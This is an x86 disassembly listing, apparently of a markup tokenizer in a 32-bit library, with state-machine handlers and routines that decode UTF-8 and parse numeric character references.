add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_1007d740
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x42
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007d864 ]
jmp [ eax * 4 + jump_table_1007d84c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x38
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
add esp 0x4
mov [ eax ] 0x39
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
add esp 0x4
mov [ ecx ] 0x3a
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x25
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
sub_1007d86a
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_1007d8b0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x42
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007d9b0 ]
jmp [ eax * 4 + jump_table_1007d998 ]
mov eax 0x2
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x39
mov eax 0x2
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x3a
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
sub_1007d9b6
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xec8b5504
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_1004c3a0
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007daf4 ]
jmp [ eax * 4 + jump_table_1007dae0 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x3b
call sub_100794e0
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_1004c3a0
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_100794e0
mov eax [ ebp + 0x14 ]
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_100794e0
mov eax [ ebp + 0x14 ]
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
sub_1007daf9
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_1007db40
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_1004c3a0
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007dc44 ]
jmp [ eax * 4 + jump_table_1007dc30 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x3b
call sub_100794e0
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_1004c3a0
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_100794e0
mov eax [ ebp + 0x14 ]
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_100794e0
mov eax [ ebp + 0x14 ]
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
sub_1007dc49
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_1007dc90
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
add esp 0x4
mov [ ecx ] 0x42
mov [ edx + 0x88 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007dd94 ]
jmp [ eax * 4 + jump_table_1007dd7c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x3c
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
call sub_10079680
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
add esp 0x4
mov [ ecx ] 0x3f
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
add esp 0x4
mov [ edx ] 0x40
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
mov ecx 0x1
add esp 0x4
mov [ eax + 0x4 ] ecx
mov [ eax + 0x88 ] ecx
lea eax [ ecx + 0x1 ]
pop esi
pop ebp
retn
sub_1007dd9a
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_1007dde0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x42
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007dec8 ]
jmp [ eax * 4 + jump_table_1007deb0 ]
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
call sub_10079680
mov eax 0x1
pop esi
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov [ eax ] 0x3f
mov eax 0x2
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x40
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
sub_1007dece
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_1007df10
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x42
add esp 0x4
mov [ ecx + 0x88 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007e02c ]
jmp [ eax * 4 + jump_table_1007e014 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x3e
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
add esp 0x4
mov [ eax ] 0x3f
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
add esp 0x4
mov [ ecx ] 0x40
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
sub_1007e032
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_1007e070
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x42
add esp 0x4
mov [ ecx + 0x88 ] 0x1
movzx eax [ eax + lookup_table_1007e160 ]
jmp [ eax * 4 + jump_table_1007e148 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x3f
mov eax 0x2
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x40
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
mov eax 0x2
pop esi
pop ebp
retn
sub_1007e166
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xec8b5504
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_1004c3a0
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007e2a4 ]
jmp [ eax * 4 + jump_table_1007e290 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x41
call sub_10079550
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_1004c3a0
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10079550
mov eax [ ebp + 0x14 ]
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10079550
mov eax [ ebp + 0x14 ]
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
sub_1007e2a9
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_1007e2f0
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_1004c3a0
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007e3f4 ]
jmp [ eax * 4 + jump_table_1007e3e0 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x41
call sub_10079550
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_1004c3a0
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10079550
mov eax [ ebp + 0x14 ]
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10079550
mov eax [ ebp + 0x14 ]
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
sub_1007e3f9
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_1007e440
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
add esp 0x4
mov [ ecx ] 0x42
movzx eax [ eax + lookup_table_1007e4dc ]
jmp [ eax * 4 + jump_table_1007e4cc ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
call sub_10079680
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
mov eax 0x2
pop esi
pop ebp
retn
sub_1007e4e0
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ecx ] eax
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_1007e520
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
cmp eax 0x3e
je r-xdata
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
cmp eax 0xffffffff
je r-xdata
mov eax 0x2
pop ebp
retn
sub_1007e560
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xffffffff
push esi
mov esi [ ebp + 0xc ]
push edi
je r-xdata
lea edi [ esi + 0x94 ]
push edi
mov [ esi + 0x4 ] 0x1
call sub_1003fa70
mov [ esi + 0x2c ] eax
add esi 0x30
push esi
push edi
call sub_1006c7a0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
add esp 0xc
pop edi
mov [ eax ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
push 0x1
push 0x3
lea eax [ esi + 0x94 ]
push r--data
push eax
call sub_10041b90
add esp 0x10
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007e5f0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x2c ]
push eax
call sub_100463f0
mov esi eax
xor ebx ebx
add esp 0x4
cmp esi ebx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov ecx [ edi + 0x14 ]
mov [ esi + 0x4 ] ecx
mov edx [ edi + 0x18 ]
mov [ esi + 0x8 ] edx
mov eax [ edi + 0x1c ]
mov [ esi + 0xc ] eax
mov ecx [ edi ]
mov [ esi + 0x10 ] ecx
mov eax [ edi + 0x10 ]
xor ecx ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] eax
cmp eax ebx
jle r-xdata
mov ecx [ ebp - 0xc ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ecx
mov edx [ edi ]
mov [ ebp - 0x4 ] edx
nop
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + ecx ]
shld edi ebx 0x8
cdq
shl ebx 0x8
or edx edi
inc ecx
or ebx eax
mov [ ebp - 0xc ] edx
cmp ecx [ ebp - 0x8 ]
jl r-xdata
sub_1007e670
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ esi ]
mov al [ ecx ]
push ebx
xor ebx ebx
xor dl dl
push edi
mov [ ebp - 0x4 ] ebx
cmp al 0x80
jae r-xdata
cmp al 0xc0
jb r-xdata
mov [ esi + 0x10 ] 0x1
or dl 0xff
jmp r-xdata
mov ebx 0x1
mov [ esi + 0x10 ] ebx
cmp al 0xe0
jae r-xdata
and al dl
movzx eax al
cdq
mov [ ebp - 0x8 ] edx
mov edx [ esi + 0x10 ]
mov edi eax
mov eax [ esi + 0x8 ]
add edx ecx
cmp edx eax
jbe r-xdata
mov ecx 0x1
cmp [ esi + 0x10 ] ecx
jle r-xdata
sub eax ecx
mov [ esi + 0x10 ] eax
push 0x1
mov eax esi
call sub_1007e5f0
mov ebx 0x1
add esp 0x4
mov [ ebp - 0x4 ] ebx
cmp al 0xf0
jae r-xdata
mov [ esi + 0x10 ] 0x2
mov dl 0x1f
cmp al 0xc2
jae r-xdata
mov ecx [ ebp - 0x8 ]
test ecx ecx
ja r-xdata
jmp r-xdata
cmp al 0xf5
jae r-xdata
mov [ esi + 0x10 ] 0x3
mov dl 0xf
jmp r-xdata
mov ebx 0x1
jmp r-xdata
push 0x0
mov eax esi
call sub_1007e5f0
add esp 0x4
mov eax 0xfffd
pop edi
mov [ ebp - 0x8 ] 0x0
mov [ esi + 0xc ] eax
pop ebx
mov esp ebp
pop ebp
retn
jb r-xdata
mov eax [ esi ]
mov al [ eax + ecx ]
lea edx [ eax + 0x80 ]
cmp dl 0x3f
ja r-xdata
cmp al 0xf8
jae r-xdata
mov [ esi + 0x10 ] 0x4
mov dl 0x7
jmp r-xdata
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
cmp edi 0x10ffff
ja r-xdata
mov [ esi + 0x10 ] ecx
mov ebx 0x1
mov ebx [ ebp - 0x8 ]
movzx eax al
shld ebx edi 0x6
and eax 0xffffff7f
cdq
shl edi 0x6
or edx ebx
inc ecx
or edi eax
mov [ ebp - 0x8 ] edx
cmp ecx [ esi + 0x10 ]
jl r-xdata
cmp al 0xfc
jae r-xdata
mov [ esi + 0x10 ] 0x5
mov ebx 0x1
jmp r-xdata
cmp edi 0x1
jl r-xdata
mov ebx [ ebp - 0x4 ]
jmp r-xdata
cmp al 0xfe
jae r-xdata
mov [ esi + 0x10 ] 0x6
mov ebx 0x1
jmp r-xdata
cmp edi 0xb
je r-xdata
cmp edi 0x8
jle r-xdata
mov [ esi + 0x10 ] 0x7
mov ebx 0x1
jmp r-xdata
cmp edi 0xe
jl r-xdata
cmp edi 0x7f
jl r-xdata
cmp edi 0x1f
jle r-xdata
cmp edi 0xfdd0
jl r-xdata
cmp edi 0x9f
jle r-xdata
mov eax edi
and eax 0xffff
cmp eax 0xfffe
je r-xdata
cmp edi 0xfdef
jle r-xdata
cmp eax 0xffff
jne r-xdata
cmp edi 0xd
jne r-xdata
mov [ esi + 0xc ] edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
jne r-xdata
mov ecx [ esi ]
mov eax [ esi + 0x10 ]
add eax ecx
cmp eax [ esi + 0x8 ]
jae r-xdata
mov eax 0xa
pop edi
mov [ ebp - 0x8 ] 0x0
mov [ esi + 0xc ] eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0xa
jne r-xdata
inc ecx
inc [ esi + 0x1c ]
mov [ esi ] ecx
sub_1007e850
push ebp
mov ebp esp
push esi
push eax
call sub_100463f0
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_1002b630
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov [ esi ] edx
cdq
add esp 0x8
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
sub_1007e890
push ebp
mov ebp esp
sub esp 0x8
push esi
push ebx
call sub_100428b0
xor esi esi
push ebx
mov [ ebp - 0x4 ] esi
call sub_100194e0
add esp 0x8
cmp eax 0x78
je r-xdata
push ebx
mov [ ebp - 0x4 ] 0x1
call sub_100428b0
push ebx
call sub_100194e0
mov esi [ ebp - 0x4 ]
add esp 0x8
cmp eax 0x58
jne r-xdata
test esi esi
je r-xdata
mov eax ecx
jmp r-xdata
lea ecx [ eax - 0x30 ]
cmp ecx 0x9
ja r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_100463f0
mov esi eax
add esp 0x4
test esi esi
je r-xdata
lea ecx [ eax - 0x61 ]
cmp ecx 0x5
ja r-xdata
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_10042e70
mov ecx [ ebp + 0xc ]
add esp 0x4
mov [ ecx ] 0xffffffff
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
push ebx
call sub_1002b630
add esp 0x8
mov [ esi ] 0x3
lea edx [ eax - 0x41 ]
cmp edx 0x5
ja r-xdata
add eax 0xffffffa9
jmp r-xdata
push edi
xor edi edi
neg esi
sbb esi esi
and esi 0x6
mov [ ebp - 0x8 ] 0x1
add esi 0xa
lea ebx [ ebx ]
add eax 0xffffffc9
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ecx
jmp r-xdata
push ebx
call sub_100194e0
add esp 0x4
cmp eax 0x3b
je r-xdata
lea ecx [ eax - 0x61 ]
cmp ecx 0x5
ja r-xdata
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_100428b0
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_100463f0
mov esi eax
add esp 0x4
test esi esi
je r-xdata
lea edx [ eax - 0x41 ]
cmp edx 0x5
ja r-xdata
add eax 0xffffffa9
jmp r-xdata
imul edi esi
push ebx
add edi eax
call sub_100428b0
push ebx
call sub_100194e0
lea ecx [ eax - 0x30 ]
add esp 0x8
cmp ecx 0x9
ja r-xdata
mov ecx [ ecx * 8 + r--data ]
mov [ ebp - 0x4 ] ecx
cmp ecx 0xffffffff
je r-xdata
mov eax [ ecx * 8 + r--data ]
inc ecx
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
push esi
push ebx
call sub_1002b630
mov eax edi
cdq
add esp 0x8
mov [ esi ] 0x4
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
add eax 0xffffffc9
cmp edi 0xd800
